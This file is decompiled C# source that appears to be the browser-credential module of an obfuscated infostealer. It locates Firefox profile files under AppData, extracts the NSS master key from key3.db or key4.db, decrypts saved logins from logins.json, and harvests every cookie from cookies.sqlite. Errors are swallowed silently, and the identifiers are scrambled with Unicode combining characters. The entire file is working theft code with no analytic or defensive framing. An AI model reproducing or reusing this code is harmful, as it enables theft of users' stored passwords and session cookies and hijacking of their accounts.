using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000065 RID: 101
	public static class Class_78
	{
		// Token: 0x060001D4 RID: 468 RVA: 0x0000F890 File Offset: 0x0000DA90
		public static List<Class_65> ParseBrowsers()
		{
			List<Class_65> list = new List<Class_65>();
			try
			{
				List<string> list2 = new List<string>();
				list2.AddRange(Class_69.FindPaths(Class_47.\u0349\u0308t\u0324\u0329\u0306\u033Ae\u0340\u0341\u036B\u0351\u0E47c\u0363\u0363xrkhflctjjgrafhq\u036A\u0E47\u0302\u0368\u0020\u032C\u035E\u0349\u0359\u0020\u0020\u0489\u0333\u030C\u0347\u032Cdfodarkersxinukm, 4, 1, new string[]
				{
					"key3.db",
					"key4.db",
					"cookies.sqlite",
					"logins.json"
				}));
				list2.AddRange(Class_69.FindPaths(Class_47.\u030A\u0330\u0314\u0E47\u036D\u0020\u0331\u036B\u0310\u0341\u0353\u0333\u035F\u0368\u0333\u0369fscvyixozutspogr\u0316\u0020\u0E47\u0340\u0020\u0325\u035A\u0342\u032F\u0366\u0303\u036D\u0344\u0302\u0338\u032Cmiwjanndutheeold, 4, 1, new string[]
				{
					"key3.db",
					"key4.db",
					"cookies.sqlite",
					"logins.json"
				}));
				foreach (string text in list2)
				{
					string fullName = new FileInfo(text).Directory.FullName;
					string text2 = text.Contains(Class_47.\u030A\u0330\u0314\u0E47\u036D\u0020\u0331\u036B\u0310\u0341\u0353\u0333\u035F\u0368\u0333\u0369fscvyixozutspogr\u0316\u0020\u0E47\u0340\u0020\u0325\u035A\u0342\u032F\u0366\u0303\u036D\u0344\u0302\u0338\u032Cmiwjanndutheeold) ? Class_78.GetRoamingName(fullName) : Class_78.GetLocalName(fullName);
					if (!string.IsNullOrEmpty(text2))
					{
						Class_65 class_ = new Class_65
						{
							prop_0 = text2,
							prop_1 = new DirectoryInfo(fullName).Name,
							prop_5 = new List<Class_66>(Class_78.ParseCookies(fullName)).IsNull<List<Class_66>>(),
							prop_2 = new List<Class_68>(Class_78.GetCredentials(fullName).IsNull<List<Class_68>>()).IsNull<List<Class_68>>(),
							prop_3 = new List<Class_64>(),
							prop_4 = new List<Class_67>()
						};
						if (class_.prop_5.Count((Class_66 x) => x.IsNotNull<Class_66>()) <= 0)
						{
							if (class_.prop_2.Count((Class_68 x) => x.IsNotNull<Class_68>()) <= 0)
							{
								continue;
							}
						}
						list.Add(class_);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060001D5 RID: 469 RVA: 0x0000FAB0 File Offset: 0x0000DCB0
		private static List<Class_68> GetCredentials(string profile)
		{
			List<Class_68> list = new List<Class_68>();
			try
			{
				if (File.Exists(Path.Combine(profile, "key3.db")))
				{
					list.AddRange(Class_78.ParseLogins(profile, Class_78.GetPrivate3Key(Class_69.CreateTempCopy(Path.Combine(profile, "key3.db")))));
				}
				if (File.Exists(Path.Combine(profile, "key4.db")))
				{
					list.AddRange(Class_78.ParseLogins(profile, Class_78.GetPrivate4Key(Class_69.CreateTempCopy(Path.Combine(profile, "key4.db")))));
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060001D6 RID: 470 RVA: 0x0000FB58 File Offset: 0x0000DD58
		private static List<Class_66> ParseCookies(string profile)
		{
			List<Class_66> list = new List<Class_66>();
			try
			{
				string text = Path.Combine(profile, "cookies.sqlite");
				if (!File.Exists(text))
				{
					return list;
				}
				Class_108 class_ = new Class_108(Class_69.CreateTempCopy(text));
				class_.smethod_400("moz_cookies");
				for (int i = 0; i < class_.prop_3; i++)
				{
					Class_66 class_2 = null;
					try
					{
						class_2 = new Class_66
						{
							prop_0 = class_.pmethod_399(i, "host").Trim(),
							prop_1 = (class_.pmethod_399(i, "isSecure") == "1"),
							prop_2 = class_.pmethod_399(i, "path").Trim(),
							prop_3 = (class_.pmethod_399(i, "isSecure") == "1"),
							prop_4 = class_.pmethod_399(i, "expiry").Trim(),
							prop_5 = class_.pmethod_399(i, "name").Trim(),
							prop_6 = class_.pmethod_399(i, "value")
						};
						Class_78.\u036B\u034B\u031F\u031D\u0E47\u031C\u0301\u034E\u0353\u0306\u0347\u033D\u0331\u0353\u0343\u0020hupvdimgmomeaylzst\u0303\u035D\u033F\u035B\u0309\u0020\u032E\u032F\u0348\u0359\u034B\u0020\u0489\u035Blscnvhohzjystpki++;
					}
					catch
					{
					}
					if (class_2 != null)
					{
						list.Add(class_2);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060001D7 RID: 471 RVA: 0x0000FCE8 File Offset: 0x0000DEE8
		private static List<Class_68> ParseLogins(string profile, byte[] privateKey)
		{
			List<Class_68> list = new List<Class_68>();
			try
			{
				string path = Class_69.CreateTempCopy(Path.Combine(profile, "logins.json"));
				if (!File.Exists(path))
				{
					return list;
				}
				foreach (object obj in ((IEnumerable)File.ReadAllText(path).FromJSON().tmethod_322("logins")))
				{
					Class_103 class_ = (Class_103)obj;
					Class_62 class_2 = Class_61.Create(Convert.FromBase64String(class_.tmethod_322("encryptedUsername").gmethod_333(false)));
					Class_62 class_3 = Class_61.Create(Convert.FromBase64String(class_.tmethod_322("encryptedPassword").gmethod_333(false)));
					string text = Regex.Replace(Class_50.Decrypt(privateKey, class_2.prop_3[0].prop_3[1].prop_3[1].prop_1, class_2.prop_3[0].prop_3[2].prop_1, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
					string text2 = Regex.Replace(Class_50.Decrypt(privateKey, class_3.prop_3[0].prop_3[1].prop_3[1].prop_1, class_3.prop_3[0].prop_3[2].prop_1, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
					Class_68 class_4 = new Class_68
					{
						prop_0 = (string.IsNullOrEmpty(class_.tmethod_322("hostname").gmethod_333(false)) ? "UNKNOWN" : class_.tmethod_322("hostname").gmethod_333(false)),
						prop_1 = (string.IsNullOrEmpty(text) ? "UNKNOWN" : text),
						prop_2 = (string.IsNullOrEmpty(text2) ? "UNKNOWN" : text2)
					};
					if (class_4.prop_1 != "UNKNOWN" && class_4.prop_2 != "UNKNOWN" && class_4.prop_0 != "UNKNOWN")
					{
						list.Add(class_4);
						Class_78.\u0340\u035A\u0020\u0020\u0320\u034E\u035Ct\u033C\u030C\u0361\u0329\u0338\u0342\u032E\u0E47vktldwvagjgorsqs\u0020\u033F\u0339\u0020\u0342\u0489\u0342\u0342\u0309\u0308\u0358\u0348\u0329\u035C\u0310ixunljsevrvauyudk++;
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060001D8 RID: 472 RVA: 0x0000FF8C File Offset: 0x0000E18C
		private static byte[] GetPrivate4Key(string file)
		{
			byte[] result = new byte[24];
			try
			{
				if (!File.Exists(file))
				{
					return result;
				}
				Class_108 class_ = new Class_108(file);
				class_.smethod_400("metaData");
				string s = class_.pmethod_399(0, "item1");
				Class_62 class_2 = Class_61.Create(Encoding.Default.GetBytes(class_.pmethod_399(0, "item2)")));
				byte[] byteDizi_ = class_2.prop_3[0].prop_3[0].prop_3[1].prop_3[0].prop_1;
				byte[] input = class_2.prop_3[0].prop_3[1].prop_1;
				Class_71 class_3 = new Class_71(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), byteDizi_);
				class_3.smethod_230();
				Class_50.Decrypt(class_3.prop_3, class_3.prop_4, input, PaddingMode.None);
				class_.smethod_400("nssPrivate");
				int num = class_.prop_3;
				string s2 = string.Empty;
				for (int i = 0; i < num; i++)
				{
					if (class_.pmethod_399(i, "a102") == Encoding.Default.GetString(Class_78.\u0368\u0363\u034A\u035D\u0020\u0E47\u034F\u0355\u0318\u034E\u036B\u034E\u0364\u033B\u0358\u0020kffuazvgifweulwv\u0347\u033C\u032F\u0342\u0325\u0359\u0020\u036B\u031D\u036A\u0342\u0E47\u036F\u0342\u0332\u0324xubcmltrgjxdhotl))
					{
						s2 = class_.pmethod_399(i, "a11");
						break;
					}
				}
				Class_62 class_4 = Class_61.Create(Encoding.Default.GetBytes(s2));
				byte[] byteDizi_2 = class_4.prop_3[0].prop_3[0].prop_3[1].prop_3[0].prop_1;
				byte[] input2 = class_4.prop_3[0].prop_3[1].prop_1;
				Class_71 class_5 = new Class_71(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), byteDizi_2);
				class_5.smethod_230();
				result = Encoding.Default.GetBytes(Class_50.Decrypt(class_5.prop_3, class_5.prop_4, input2, PaddingMode.PKCS7));
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x060001D9 RID: 473 RVA: 0x000101CC File Offset: 0x0000E3CC
		private static byte[] GetPrivate3Key(string file)
		{
			byte[] array = new byte[24];
			try
			{
				if (!File.Exists(file))
				{
					return array;
				}
				new DataTable();
				Class_70 berkeleyDB = new Class_70(file);
				Class_72 class_ = new Class_72(Class_78.ParseDb(berkeleyDB, (string x) => x.Equals("password-check")));
				string hexString = Class_78.ParseDb(berkeleyDB, (string x) => x.Equals("global-salt"));
				Class_71 class_2 = new Class_71(Class_69.ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), Class_69.ConvertHexStringToByteArray(class_.prop_0));
				class_2.smethod_230();
				Class_50.Decrypt(class_2.prop_3, class_2.prop_4, Class_69.ConvertHexStringToByteArray(class_.prop_2), PaddingMode.None);
				Class_62 class_3 = Class_61.Create(Class_69.ConvertHexStringToByteArray(Class_78.ParseDb(berkeleyDB, (string x) => !x.Equals("password-check") && !x.Equals("Version") && !x.Equals("global-salt"))));
				Class_71 class_4 = new Class_71(Class_69.ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), class_3.prop_3[0].prop_3[0].prop_3[1].prop_3[0].prop_1);
				class_4.smethod_230();
				Class_62 class_5 = Class_61.Create(Class_61.Create(Encoding.Default.GetBytes(Class_50.Decrypt(class_4.prop_3, class_4.prop_4, class_3.prop_3[0].prop_3[1].prop_1, PaddingMode.None))).prop_3[0].prop_3[2].prop_1);
				if (class_5.prop_3[0].prop_3[3].prop_1.Length > 24)
				{
					Array.Copy(class_5.prop_3[0].prop_3[3].prop_1, class_5.prop_3[0].prop_3[3].prop_1.Length - 24, array, 0, 24);
				}
				else
				{
					array = class_5.prop_3[0].prop_3[3].prop_1;
				}
			}
			catch
			{
			}
			return array;
		}

		// Token: 0x060001DA RID: 474 RVA: 0x00010458 File Offset: 0x0000E658
		private static string ParseDb(Class_70 berkeleyDB, Func<string, bool> predicate)
		{
			string text = string.Empty;
			try
			{
				foreach (KeyValuePair<string, string> keyValuePair in berkeleyDB.prop_1)
				{
					if (predicate(keyValuePair.Key))
					{
						text = keyValuePair.Value;
					}
				}
			}
			catch
			{
			}
			return text.Replace("-", string.Empty);
		}

		// Token: 0x060001DB RID: 475 RVA: 0x00010500 File Offset: 0x0000E700
		private static string GetRoamingName(string profilesDirectory)
		{
			string text = string.Empty;
			try
			{
				string[] array = profilesDirectory.Split(new string[]
				{
					"AppData\\Roaming\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
			}
			catch
			{
			}
			return text.Replace(" ", string.Empty);
		}

		// Token: 0x060001DC RID: 476 RVA: 0x000105A4 File Offset: 0x0000E7A4
		private static string GetLocalName(string profilesDirectory)
		{
			string text = string.Empty;
			try
			{
				string[] array = profilesDirectory.Split(new string[]
				{
					"AppData\\Local\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
			}
			catch
			{
			}
			return text.Replace(" ", string.Empty);
		}

		// Token: 0x0400012D RID: 301
		public static int \u0340\u035A\u0020\u0020\u0320\u034E\u035Ct\u033C\u030C\u0361\u0329\u0338\u0342\u032E\u0E47vktldwvagjgorsqs\u0020\u033F\u0339\u0020\u0342\u0489\u0342\u0342\u0309\u0308\u0358\u0348\u0329\u035C\u0310ixunljsevrvauyudk = 0;

		// Token: 0x0400012E RID: 302
		public static int \u036B\u034B\u031F\u031D\u0E47\u031C\u0301\u034E\u0353\u0306\u0347\u033D\u0331\u0353\u0343\u0020hupvdimgmomeaylzst\u0303\u035D\u033F\u035B\u0309\u0020\u032E\u032F\u0348\u0359\u034B\u0020\u0489\u035Blscnvhohzjystpki = 0;

		// Token: 0x0400012F RID: 303
		public static readonly byte[] \u0368\u0363\u034A\u035D\u0020\u0E47\u034F\u0355\u0318\u034E\u036B\u034E\u0364\u033B\u0358\u0020kffuazvgifweulwv\u0347\u033C\u032F\u0342\u0325\u0359\u0020\u036B\u031D\u036A\u0342\u0E47\u036F\u0342\u0332\u0324xubcmltrgjxdhotl = new byte[]
		{
			248,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			1
		};
	}
}
